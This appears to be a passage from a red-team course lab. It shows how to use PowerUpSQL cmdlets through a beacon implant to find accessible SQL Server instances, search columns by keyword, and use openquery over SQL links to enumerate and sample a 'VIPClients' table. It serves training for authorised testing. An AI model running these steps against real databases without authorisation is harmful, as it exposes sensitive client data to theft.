We reviewed multiple methods for executing SQL queries in the **MS SQL Servers** section, but they would not scale well for searching across dozens of instances. PowerUpSQL provides some additional cmdlets designed for data searching and extraction.

One such cmdlet is `Get-SQLColumnSampleDataThreaded`, which can search one or more instances for databases that contain particular keywords in the column names.

```
beacon> powershell Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "project" -SampleSize 5 | select instance, database, column, sample | ft -autosize

Instance                     Database Column      Sample         
--------                     -------- ------      ------         
srv-1.dev.cyberbotic.io,1433 master   ProjectName Mild Sun       
srv-1.dev.cyberbotic.io,1433 master   ProjectName Warm Venus     
srv-1.dev.cyberbotic.io,1433 master   ProjectName Grim Lyric     
srv-1.dev.cyberbotic.io,1433 master   ProjectName Precious Castle
srv-1.dev.cyberbotic.io,1433 master   ProjectName Fine Devil  
```

  

This can only search the instances you have direct access to, it won't traverse any SQL links. To search over the links use `Get-SQLQuery`.

```
beacon> powershell Get-SQLQuery -Instance "srv-1.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select * from information_schema.tables')"

TABLE_CATALOG TABLE_SCHEMA TABLE_NAME            TABLE_TYPE
------------- ------------ ----------            ----------
master        dbo          spt_fallback_db       BASE TABLE
master        dbo          spt_fallback_dev      BASE TABLE
master        dbo          spt_fallback_usg      BASE TABLE
master        dbo          spt_values            VIEW      
master        dbo          spt_monitor           BASE TABLE
master        dbo          MSreplication_options BASE TABLE
master        dbo          VIPClients            BASE TABLE
```

```
beacon> powershell Get-SQLQuery -Instance "srv-1.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select column_name from master.information_schema.columns')"

column_name
-----------
City
Name
OrgNumber
Street
VIPClientsID
```

```
beacon> powershell Get-SQLQuery -Instance "srv-1.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select top 5 OrgNumber from master.dbo.VIPClients')"

OrgNumber  
---------  
65618655299
69838663099
12289506999
73723428599
51766460299
```
  
If this is real data, don't extract multiple columns that can be correlated together. As in this example, take a sample of a column that doesn't really mean anything in isolation.

To simulate data exfiltration of large dataset, have a look at [Egress Assess](https://github.com/FortyNorthSecurity/Egress-Assess).